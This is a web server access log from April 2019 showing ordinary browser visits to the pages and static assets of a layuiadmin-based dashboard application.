114.33.154.192 - - [14/Apr/2019:14:39:30 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
120.199.34.98 - - [14/Apr/2019:15:38:30 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:30 +0800] "GET /static/layuiadmin/style/admin.css HTTP/1.1" 200 26143 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:30 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/layer.css HTTP/1.1" 200 14425 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:30 +0800] "GET /static/layuiadmin/layui/layui.js HTTP/1.1" 200 6667 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:30 +0800] "GET /static/favicon.ico HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:31 +0800] "GET /static/layuiadmin/layui/css/layui.css HTTP/1.1" 200 69524 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:31 +0800] "GET /views/console HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:31 +0800] "GET /static/layuiadmin/layui/font/iconfont.woff?v=240 HTTP/1.1" 200 26744 "http://119.29.225.142/static/layuiadmin/layui/css/layui.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:31 +0800] "GET /static/layuiadmin/lib/index.js HTTP/1.1" 200 2434 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:32 +0800] "GET /static/layuiadmin/config.js HTTP/1.1" 200 5395 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:32 +0800] "GET /static/layuiadmin/layui/lay/modules/laytpl.js HTTP/1.1" 200 1836 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:32 +0800] "GET /static/layuiadmin/layui/lay/modules/layer.js HTTP/1.1" 200 22041 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:32 +0800] "GET /views/console/ HTTP/1.1" 200 13361 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:32 +0800] "GET /static/layuiadmin/layui/layui.js?t=1 HTTP/1.1" 200 6667 "http://119.29.225.142/views/console/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:33 +0800] "GET /static/layuiadmin/layui/lay/modules/jquery.js HTTP/1.1" 200 97648 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:33 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/layer.css?v=3.1.1 HTTP/1.1" 200 14425 "http://119.29.225.142/views/console/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:33 +0800] "GET /static/layuiadmin/layui/lay/modules/element.js HTTP/1.1" 200 7264 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:33 +0800] "GET /static/layuiadmin/layui/lay/modules/util.js HTTP/1.1" 200 3458 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:33 +0800] "GET /static/layuiadmin/lib/admin.js HTTP/1.1" 200 25706 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:34 +0800] "GET /static/layuiadmin/lib/view.js HTTP/1.1" 200 9831 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:34 +0800] "GET /static/layuiadmin/modules/common.js HTTP/1.1" 200 1009 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:34 +0800] "GET /static/layuiadmin/modules/console.js HTTP/1.1" 200 5135 "http://119.29.225.142/views/console/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:34 +0800] "GET /static/layuiadmin/layui/lay/modules/carousel.js HTTP/1.1" 200 3839 "http://119.29.225.142/views/console/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:35 +0800] "GET /views/consoles HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:36 +0800] "GET /views/consoles/ HTTP/1.1" 200 12950 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.5 - - [14/Apr/2019:15:38:36 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:38:37 +0800] "GET /static/layuiadmin/style/custom.css HTTP/1.1" 200 392 "http://119.29.225.142/views/consoles/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:37 +0800] "GET /static/layuiadmin/modules/console2.js HTTP/1.1" 200 3561 "http://119.29.225.142/views/consoles/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.4 - - [14/Apr/2019:15:38:42 +0800] "GET /static/layuiadmin/layui/css/layui.css HTTP/1.1" 200 69524 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.66 - - [14/Apr/2019:15:38:43 +0800] "GET /static/layuiadmin/style/admin.css HTTP/1.1" 200 26143 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.66 - - [14/Apr/2019:15:38:43 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/layer.css HTTP/1.1" 200 14425 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:38:43 +0800] "GET /static/layuiadmin/layui/layui.js HTTP/1.1" 200 6667 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:38:47 +0800] "GET /static/layuiadmin/lib/index.js HTTP/1.1" 200 2434 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:38:47 +0800] "GET /static/layuiadmin/layui/font/iconfont.woff?v=240 HTTP/1.1" 200 26744 "http://119.29.225.142/static/layuiadmin/layui/css/layui.css" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:38:48 +0800] "GET /views/console HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.5 - - [14/Apr/2019:15:38:49 +0800] "GET /static/layuiadmin/config.js HTTP/1.1" 200 5395 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:38:54 +0800] "GET /static/layuiadmin/layui/lay/modules/laytpl.js HTTP/1.1" 200 1836 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:38:55 +0800] "GET /views/distinguish HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:38:55 +0800] "GET /views/distinguish/ HTTP/1.1" 200 4075 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.4 - - [14/Apr/2019:15:38:56 +0800] "GET /views/console/ HTTP/1.1" 200 13362 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:38:56 +0800] "GET /static/layuiadmin/layui/lay/modules/form.js HTTP/1.1" 200 9259 "http://119.29.225.142/views/distinguish/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.5 - - [14/Apr/2019:15:38:58 +0800] "GET /static/layuiadmin/layui/lay/modules/layer.js HTTP/1.1" 200 22041 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.5 - - [14/Apr/2019:15:39:00 +0800] "GET /static/layuiadmin/layui/lay/modules/jquery.js HTTP/1.1" 200 97648 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:39:01 +0800] "GET /static/layuiadmin/lib/extend/echarts.js HTTP/1.1" 200 2869986 "http://119.29.225.142/views/consoles/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:02 +0800] "GET /static/layuiadmin/lib/extend/echartsTheme.js HTTP/1.1" 200 4330 "http://119.29.225.142/views/consoles/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.66 - - [14/Apr/2019:15:39:02 +0800] "GET /static/layuiadmin/style/admin.css HTTP/1.1" 200 26143 "http://119.29.225.142/views/console/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:39:02 +0800] "GET /static/layuiadmin/layui/css/layui.css HTTP/1.1" 200 69524 "http://119.29.225.142/views/console/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.5 - - [14/Apr/2019:15:39:03 +0800] "GET /static/layuiadmin/layui/layui.js?t=1 HTTP/1.1" 200 6667 "http://119.29.225.142/views/console/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:39:03 +0800] "GET /static/layuiadmin/layui/lay/modules/element.js HTTP/1.1" 200 7264 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:39:12 +0800] "GET /views/entityQuery HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:13 +0800] "GET /views/entityQuery/ HTTP/1.1" 200 10471 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:14 +0800] "GET /static/layuiadmin/style/search-bg.jpg HTTP/1.1" 200 107812 "http://119.29.225.142/views/entityQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:27 +0800] "GET /views/relationQuery HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:27 +0800] "GET /views/relationQuery/ HTTP/1.1" 200 7958 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:27 +0800] "GET /static/layuiadmin/modules/relationQuery.js HTTP/1.1" 200 6931 "http://119.29.225.142/views/relationQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:28 +0800] "GET /views/relationQuery/relation HTTP/1.1" 301 0 "http://119.29.225.142/views/relationQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:28 +0800] "GET /views/relationQuery/relation/ HTTP/1.1" 200 75 "http://119.29.225.142/views/relationQuery/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
101.91.62.99 - - [14/Apr/2019:15:39:30 +0800] "GET / HTTP/1.1" 200 12678 "22F93510D2EF14BE50120.199.34.98" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
101.91.62.99 - - [14/Apr/2019:15:39:32 +0800] "GET /views/console HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
101.91.62.99 - - [14/Apr/2019:15:39:32 +0800] "GET /static/layuiadmin/layui/layui.js HTTP/1.1" 200 6667 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; rv:11.0) like Gecko"
180.163.220.68 - - [14/Apr/2019:15:39:45 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.68 - - [14/Apr/2019:15:39:52 +0800] "GET /static/layuiadmin/layui/css/layui.css HTTP/1.1" 200 69524 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:39:52 +0800] "GET /views/interlocution HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:52 +0800] "GET /views/interlocution/ HTTP/1.1" 200 4095 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:52 +0800] "GET /static/layuiadmin/style/im.css HTTP/1.1" 200 294 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/modules/im.js HTTP/1.1" 200 4274 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/layui/lay/modules/layim.js HTTP/1.1" 200 35746 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/modules/im2.js HTTP/1.1" 200 3756 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.3 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/style/admin.css HTTP/1.1" 200 26143 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.68 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/layer.css HTTP/1.1" 200 14425 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/layui/lay/modules/upload.js HTTP/1.1" 200 6971 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/layui/css/modules/layim/layim.css?v=3.7.8 HTTP/1.1" 200 20150 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/layui/css/modules/layer/default/icon.png HTTP/1.1" 200 11493 "http://119.29.225.142/static/layuiadmin/layui/css/modules/layer/default/layer.css?v=3.1.1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/layui/css/modules/layim/skin/3.jpg HTTP/1.1" 200 18610 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/style/userhead.gif HTTP/1.1" 200 2162 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:39:53 +0800] "GET /static/layuiadmin/style/kangkang.png HTTP/1.1" 200 94622 "http://119.29.225.142/views/interlocution/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
180.163.220.3 - - [14/Apr/2019:15:39:54 +0800] "GET /static/layuiadmin/layui/layui.js HTTP/1.1" 200 6667 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:39:58 +0800] "GET /static/layuiadmin/layui/font/iconfont.woff?v=240 HTTP/1.1" 200 26744 "http://119.29.225.142/static/layuiadmin/layui/css/layui.css" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.68 - - [14/Apr/2019:15:39:59 +0800] "GET /views/console HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.68 - - [14/Apr/2019:15:40:00 +0800] "GET /static/layuiadmin/lib/index.js HTTP/1.1" 200 2434 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:40:07 +0800] "GET /views/console/ HTTP/1.1" 200 13442 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.4 - - [14/Apr/2019:15:40:11 +0800] "GET /static/layuiadmin/config.js HTTP/1.1" 200 5395 "http://119.29.225.142/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.3 - - [14/Apr/2019:15:40:12 +0800] "GET /static/layuiadmin/style/admin.css HTTP/1.1" 200 26143 "http://119.29.225.142/views/console/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.68 - - [14/Apr/2019:15:40:12 +0800] "GET /static/layuiadmin/layui/layui.js?t=1 HTTP/1.1" 200 6667 "http://119.29.225.142/views/console/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
180.163.220.68 - - [14/Apr/2019:15:40:12 +0800] "GET /static/layuiadmin/layui/css/layui.css HTTP/1.1" 200 69524 "http://119.29.225.142/views/console/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
120.199.34.98 - - [14/Apr/2019:15:40:23 +0800] "GET /views/classifiedQuery HTTP/1.1" 301 0 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
120.199.34.98 - - [14/Apr/2019:15:40:23 +0800] "GET /views/classifiedQuery/ HTTP/1.1" 200 11624 "http://119.29.225.142/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
